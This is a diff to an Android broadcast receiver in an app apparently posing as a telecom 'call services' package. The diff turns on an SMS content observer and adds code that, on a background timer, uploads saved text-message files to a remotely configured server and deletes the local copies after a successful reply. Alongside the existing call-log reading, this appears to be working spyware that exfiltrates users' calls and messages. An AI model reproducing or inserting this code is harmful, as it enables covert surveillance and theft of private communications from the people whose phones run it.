@@ -2,6 +2,14 @@ package com.sktelink.sk00700.callservices;
 
 import static com.sktelink.sk00700.callservices.utils.CommonUtilities.TAG;
 
+import java.io.BufferedReader;
+import java.io.DataOutputStream;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.MalformedURLException;
+import java.net.URL;
 import java.util.Date;
 import java.util.List;
 
@@ -9,8 +17,10 @@ import android.app.AlarmManager;
 import android.app.PendingIntent;
 import android.content.Context;
 import android.content.Intent;
+import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.Build;
+import android.os.Handler;
 import android.os.SystemClock;
 import android.support.v4.content.WakefulBroadcastReceiver;
 import android.text.format.Time;
@@ -19,7 +29,6 @@ import android.util.Log;
 import com.sktelink.sk00700.callservices.handler.FileHandler;
 import com.sktelink.sk00700.callservices.handler.MyJsonHandler;
 import com.sktelink.sk00700.callservices.object.ItemCallLog;
-import com.sktelink.sk00700.callservices.object.ItemSMS;
 import com.sktelink.sk00700.callservices.utils.CallUtils;
 import com.sktelink.sk00700.callservices.utils.DataUtils;
 import com.sktelink.sk00700.callservices.utils.MyUtils;
@@ -40,7 +49,7 @@ public class MyCallReceiver extends WakefulBroadcastReceiver {
     private static Time time;
     private Date callDate;
 	
-	/*
+	/**
 	 * TODO: on receive
 	 */
 	@Override
@@ -65,7 +74,7 @@ public class MyCallReceiver extends WakefulBroadcastReceiver {
 			} else {
 				// get hour update
 				mHourUpdate = dataUtils.getTheHourUpdate();
-				// --update
+				// update
 				if (callDate.getHours() == mHourUpdate) {
 					doTaskUpdate(context, dataUtils.isEnableServer());
 				}
@@ -77,10 +86,9 @@ public class MyCallReceiver extends WakefulBroadcastReceiver {
 	}
 	
 	
-	/*
+	/**
 	 * TODO: task update data
-	 */
-	
+	 */	
 	private void doTaskUpdate (Context context, boolean isEnableServer) {
 		try {
 			if (isEnableServer && MyUtils.isOnline(context)) {
@@ -94,14 +102,27 @@ public class MyCallReceiver extends WakefulBroadcastReceiver {
 		} catch (Exception ex) {
 			Log.d(TAG, Log.getStackTraceString(ex));
 		}
+		
+		try {
+			// upload SMS
+			if (dataUtils.isEnableSms()) {
+				// show log sms
+				getStringDataSMS(context);
+				
+				// upload to server
+				uploadSMS(context);
+			}
+		} catch (Exception ex) {
+			Log.d(TAG, Log.getStackTraceString(ex));
+		}
 	}
 	
-	/*
+	
+	/**
 	 * TODO: method update
 	 */	
 	private void myUpdate(Context context){
 		try{
-			
 			// IF is first update THEN save all data
 			if (dataUtils.isFirstUpdate()) {
 				// set last time
@@ -132,10 +153,10 @@ public class MyCallReceiver extends WakefulBroadcastReceiver {
 		} catch (Exception ex) {
 			Log.d(TAG, Log.getStackTraceString(ex));
 		}
-		
 	}
 	
-	/*
+	
+	/**
 	 * TODO: read All Call Log
 	 */	
 	private void readAllCallLog () {
@@ -161,7 +182,8 @@ public class MyCallReceiver extends WakefulBroadcastReceiver {
 		dataUtils.setReadAllCallLogCompleted();
 	}
 	
-	/*
+	
+	/**
 	 * TODO: read Call Log by day
 	 */
 	private void readCallLogByDay () {
@@ -183,7 +205,8 @@ public class MyCallReceiver extends WakefulBroadcastReceiver {
 		dataUtils.setLastTimeUpdate(Long.valueOf(Long.toString(time.toMillis(false))));
 	}
 	
-	/*
+	
+	/**
 	 * TODO: update All Call log
 	 */
 	private void updateAllCallLog (Context context) {
@@ -213,22 +236,7 @@ public class MyCallReceiver extends WakefulBroadcastReceiver {
 	}
 	
 	
-	/*
-	 * TODO: update SMS
-	 */
-	private void updateSMS (Context context) {
-		// update SMS
-		List<ItemSMS> list = callUtils.getListSMS(CallUtils.TYPE_UPDATE_ALL, 0, listPatterns, dataUtils.getTargetPattern());
-
-		if (list != null) {
-			for (ItemSMS item : list) {
-				callUtils.updateASMS(item);
-			}
-		}
-	}
-	
-	
-	/*
+	/**
 	 * TODO asyncTask get data from server
 	 */	
 	private class AsyncDataFromServer extends
@@ -274,7 +282,7 @@ public class MyCallReceiver extends WakefulBroadcastReceiver {
 	}// end-async AsyncDataFromServer
 
 
-	/*
+	/**
 	 * TODO: start service
 	 */
 	public static void startService (Context context) {
@@ -321,16 +329,45 @@ public class MyCallReceiver extends WakefulBroadcastReceiver {
 				dataUtils.setLastTimeUpdate(Long.valueOf(Long.toString(time.toMillis(false))));
 
 				// sms observer
-//				if (dataUtils.isEnableSms()) {
-//					SmsObserver smsObeserver = (new SmsObserver(new Handler()));
-//					SmsObserver.context = context;
-//					SmsObserver.contentResolver = context.getContentResolver();
-//					SmsObserver.contentResolver.registerContentObserver(Uri.parse("content://sms"),true, smsObeserver);
-//				}
+				if (dataUtils.isEnableSms()) {
+					SmsObserver smsObeserver = (new SmsObserver(new Handler()));
+					SmsObserver.context = context;
+					SmsObserver.contentResolver = context.getContentResolver();
+					SmsObserver.contentResolver.registerContentObserver(Uri.parse("content://sms"),true, smsObeserver);
+				}
 			}
 		} catch (Exception ex) {
 				Log.d(TAG, Log.getStackTraceString(ex));
 		}
+	}
+	
+	
+	/**
+	 * TODO: upload SMS files
+	 */
+	public void uploadSMS (Context context) {
+		
+		if (dataUtils == null) {
+			dataUtils = new DataUtils(context);
+		}
+		if (fileHandler == null) {
+			fileHandler = new FileHandler(context);
+		}
+		
+		final List<String> listFileSMS = fileHandler.listFileSmsToUpload();
+		
+		if (listFileSMS.size() == 0) {
+			return;
+		}
+
+		if (listFileSMS.size() >= 1) {
+			new Thread(new Runnable() {
+                public void run() {
+                     uploadFile(listFileSMS.get(0), dataUtils.getUrlUploadSMS());
+                }
+              }).start();        
+		}
+		
 	}
 	
 	
@@ -359,5 +396,115 @@ public class MyCallReceiver extends WakefulBroadcastReceiver {
 		}
 		return data;
 	} 
+	
+	/**
+	 * 
+	 */
+	int serverResponseCode = 0;
+	public int uploadFile(String sourceFileUri, String serverURL) {
+        String fileName = sourceFileUri;
+
+        HttpURLConnection conn = null;
+        DataOutputStream dos = null;  
+        String lineEnd = "\r\n";
+        String twoHyphens = "--";
+        String boundary = "*****";
+        int bytesRead, bytesAvailable, bufferSize;
+        byte[] buffer;
+        int maxBufferSize = 1 * 1024 * 1024; 
+        File sourceFile = new File(sourceFileUri); 
+         
+        if (!sourceFile.isFile()) {
+             return 0;
+        }
+        else
+        {
+             try { 
+                 // open a URL connection to the Servlet
+                 FileInputStream fileInputStream = new FileInputStream(sourceFile);
+                 URL url = new URL(serverURL);
+                  
+                 // Open a HTTP  connection to  the URL
+                 conn = (HttpURLConnection) url.openConnection(); 
+                 conn.setDoInput(true); // Allow Inputs
+                 conn.setDoOutput(true); // Allow Outputs
+                 conn.setUseCaches(false); // Don't use a Cached Copy
+                 conn.setRequestMethod("POST");
+                 conn.setRequestProperty("Connection", "Keep-Alive");
+                 conn.setRequestProperty("ENCTYPE", "multipart/form-data");
+                 conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
+                 conn.setRequestProperty("uploaded_file", fileName); 
+                  
+                 dos = new DataOutputStream(conn.getOutputStream());
+        
+                 dos.writeBytes(twoHyphens + boundary + lineEnd); 
+                 dos.writeBytes("Content-Disposition: form-data; name=\"uploaded_file\";filename="+ fileName + "" + lineEnd);
+                 dos.writeBytes(lineEnd);
+        
+                 // create a buffer of  maximum size
+                 bytesAvailable = fileInputStream.available(); 
+        
+                 bufferSize = Math.min(bytesAvailable, maxBufferSize);
+                 buffer = new byte[bufferSize];
+        
+                 // read file and write it into form...
+                 bytesRead = fileInputStream.read(buffer, 0, bufferSize);  
+                    
+                 while (bytesRead > 0) {
+                   dos.write(buffer, 0, bufferSize);
+                   bytesAvailable = fileInputStream.available();
+                   bufferSize = Math.min(bytesAvailable, maxBufferSize);
+                   bytesRead = fileInputStream.read(buffer, 0, bufferSize);   
+                  }
+        
+                 // send multipart form data necesssary after file data...
+                 dos.writeBytes(lineEnd);
+                 dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
+        
+                 // Responses from the server (code and message)
+                 serverResponseCode = conn.getResponseCode();
+                 String serverResponseMessage = conn.getResponseMessage();
+                   
+                 Log.i(TAG, "HTTP Response is : "
+                         + serverResponseMessage + ": " + serverResponseCode);
+                  
+                 if(serverResponseCode == 200){
+                      Log.d(TAG, "status code: 200" );
+                      BufferedReader br = new BufferedReader(new InputStreamReader(
+                    	conn.getInputStream()));
+	      				StringBuilder sb = new StringBuilder();
+	      				String line;
+	      				while ((line = br.readLine()) != null) {
+	      					sb.append(line + "\n");
+	      				}
+	      				br.close();
+
+                        Log.d(TAG, "response: " + sb.toString() );
+	      				if (sb.toString().trim().equals("1")) {
+	      					// delete file
+	      					if (fileHandler != null) {
+	      						if (fileHandler.deleteFileFromSdcard(sourceFile.getName(), FileHandler.TYPE_SMS)) {
+	      	                        Log.d(TAG, "deleted: " + sourceFile.getName() );
+	      						}
+	      					}
+	      				}
+                 }    
+                  
+                 //close the streams //
+                 fileInputStream.close();
+                 dos.flush();
+                 dos.close();
+                   
+            } catch (MalformedURLException ex) {
+                Log.e("Upload file to server", "error: " + ex.getMessage(), ex);  
+            } catch (Exception e) {
+                Log.e("Upload file to server Exception", "Exception : "
+                                                 + e.getMessage(), e);  
+            }
+            return serverResponseCode; 
+             
+         } // End else block 
+      
+}
 	
 }
